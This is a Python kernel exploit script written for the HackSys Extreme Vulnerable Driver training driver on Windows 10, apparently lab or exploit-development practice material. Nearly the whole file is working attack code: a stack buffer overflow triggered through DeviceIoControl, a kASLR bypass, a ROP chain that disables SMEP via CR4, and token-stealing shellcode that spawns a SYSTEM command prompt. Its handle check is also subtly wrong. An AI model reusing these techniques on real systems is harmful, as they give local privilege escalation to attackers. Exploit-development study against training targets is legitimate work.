"""
Description: Vanilla Buffer Overflow via "TriggerBufferOverflowStack" HEVD 3.00
Author: Cody Winkler
Contact: @cwinfosec (twitter)
Date: 11/5/2023
Tested On: Microsoft Windows 10 Enterprise Evaluation 10.0.17763 N/A Build 17763 (x86_x64)
"""
import aslr
import ctypes
import struct
import sys

from subprocess import Popen

from ctypes import *

# Load the kernel32.dll library
kernel32 = ctypes.windll.kernel32

# CreateFileA function signature
CreateFileA = kernel32.CreateFileA
CreateFileA.argtypes = [ctypes.c_char_p,	# lpFileName
	ctypes.c_uint32,			# dwDesiredAccess
	ctypes.c_uint32,			# dwShareMode
	ctypes.c_void_p,			# lpSecurityAttributes
	ctypes.c_uint32,			# dwCreationDisposition
	ctypes.c_uint32,			# dwFlagsAndAttributes
	ctypes.c_void_p]			# hTemplateFile
CreateFileA.restype = ctypes.c_void_p		# The return type

# DeviceIoControl function signature
DeviceIoControl = kernel32.DeviceIoControl
DeviceIoControl.argtypes = [
	ctypes.c_void_p,			# hDevice
	ctypes.c_ulong,				# dwIoControlCode
	ctypes.c_void_p,			# lpInBuffer
	ctypes.c_ulong,				# nInBufferSize
	ctypes.c_void_p,			# lpOutBuffer
	ctypes.c_ulong,				# nOutBufferSize
	ctypes.POINTER(ctypes.c_ulong),		# lpBytesReturned
	ctypes.c_void_p]			# lpOverlapped
DeviceIoControl.restype = ctypes.c_int

def msf_fuzz():
	# Length: 3000
	offset = b"Aa0Aa1Aa2..."
	return offset

def craft_dep_bypass(shellcode):
	# Bypass DEP via VirtualAlloc
	print("[+] Creating DEP bypass at return address")
	try:
		ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
		bypass_dep = kernel32.VirtualAlloc(c_int64(0), c_int(len(shellcode)), c_int(0x3000), c_int(0x40))
		kernel32.RtlMoveMemory(c_int64(bypass_dep), shellcode, c_int64(len(shellcode)))
		ret_addr = struct.pack("<Q", bypass_dep)
	except Exception as e:
		print(repr(e))
		sys.exit()

	return ret_addr

def craft_shellcode():
	# Shellcode to run

	shellcode = b""
	shellcode += b"\xcc"*8				# debugger interrupt - we land here
	shellcode += b"\x90"*8				# padding - but get SMEP BSOD as soon as we hit NOP padding???
	shellcode += b"\x48\x31\xc0"                	# xor    rax,rax
	shellcode += b"\x65\x48\x8b\x80\x88\x01\x00"    # mov    rax,QWORD PTR gs:[rax+0x188]
	shellcode += b"\x00"				# align
	shellcode += b"\x48\x8b\x80\xb8\x00\x00\x00"    # mov    rax,QWORD PTR [rax+0xb8]
	shellcode += b"\x48\x89\xc1"                	# mov    rcx,rax
	shellcode += b"\x49\x89\xcb"                	# mov    r11,rcx
	shellcode += b"\x49\x83\xe3\x07"             	# and    r11,0x7
	shellcode += b"\xba\x04\x00\x00\x00"          	# mov    edx,0x4
	shellcode += b"\x48\x8b\x80\xe8\x02\x00\x00"    # mov    rax,QWORD PTR [rax+0x2e8]
	shellcode += b"\x48\x2d\xe8\x02\x00\x00"       	# sub    rax,0x2e8
	shellcode += b"\x48\x39\x90\xe0\x02\x00\x00"    # cmp    QWORD PTR [rax+0x2e0],rdx
	shellcode += b"\x75\xea"                   	# jne    21 <.text+0x21>
	shellcode += b"\x48\x8b\x90\x58\x03\x00\x00"    # mov    rdx,QWORD PTR [rax+0x358]
	shellcode += b"\x48\x83\xe2\xf0"             	# and    rdx,0xfffffffffffffff0
	shellcode += b"\x4c\x09\xda"                	# or     rdx,r11
	shellcode += b"\x48\x89\x91\x58\x03\x00\x00"    # mov    QWORD PTR [rcx+0x358],rdx

	restore_kernel = b""
	restore_kernel += b"\x48\x83\xc4\x28"           #add    rsp,0x28
	restore_kernel += b"\xc3"                      	#ret

	return shellcode + restore_kernel

def craft_buffer_payload():

	# Exploit payload
	offset = b"\x41" * 2072
	#offset = msf_fuzz()

	# Setup kASLR bypass
	kernel_base_addr = aslr.get_kernel_base()
	print(f"[+] Got kernel base: {hex(kernel_base_addr)}")

	# Setup Shellcode & DEP Bypass
	shellcode = craft_shellcode()
	dep_bypass = craft_dep_bypass(shellcode)

	###
	#	ROP CHAIN
	###
	rop_chain = struct.pack("<Q", kernel_base_addr + 0x066bae)	# pop rcx, ret;
	rop_chain += struct.pack("<Q", 0x70678)				# flip SMEP bip
	rop_chain += struct.pack("<Q", kernel_base_addr + 0x292ee9) 	# mov cr4, rcx; ret;
	rop_chain += dep_bypass

	#buffer_payload = create_string_buffer(offset)			# Fuzz
	buffer_payload = create_string_buffer(offset + rop_chain)	# Exploit

	return buffer_payload

def trigger_vuln(driver_handle):

	# IOCTL value for TriggerBufferOverflowStack
	ioctl_code = 0x222003

	# Generate the payload
	buffer_payload = craft_buffer_payload()
	
	# Define DeviceIoControl handler and send the payload to the driver
	print("[+] Calling IOCTL to trigger vulnerability...")
	nt_status = DeviceIoControl(
		driver_handle,					
		ioctl_code,
		buffer_payload,
		len(buffer_payload) - 1,
		0,
		0,
		ctypes.byref(ctypes.c_ulong()),
		0) 

	Popen("start cmd", shell=True)
	print("[+] Spawned cmd as System!")

	return

def get_driver_handle():
	# Call CreateFileA to open handle on driver
	print("[+] Opening handle on driver object")
	driver_handle = CreateFileA(b"\\\\.\\HackSysExtremeVulnerableDriver",  # lpFileName
		0xC0000000,		# GENERIC_ALL
		0,			# FILE_SHARE_READ
		None,			# lpSecurityAttributes
		0x3,			# OPEN_EXISTING
		0,			# FILE_ATTRIBUTE_NORMAL
		None)			# hTemplateFile

	return driver_handle

def main():
	# Setup the handle to the driver
	try:
		driver_handle = get_driver_handle()
	except Exception as e:
		print(repr(e))

	# Trigger the buffer overflow
	if (driver_handle != 0) or (driver_handle != -1):
		print("[+] Acquired handle to driver")
		print(f"[+] driver_handle: {driver_handle}")

		trigger_vuln(driver_handle)
	else:
		print("[-] Error opening file.")

main()
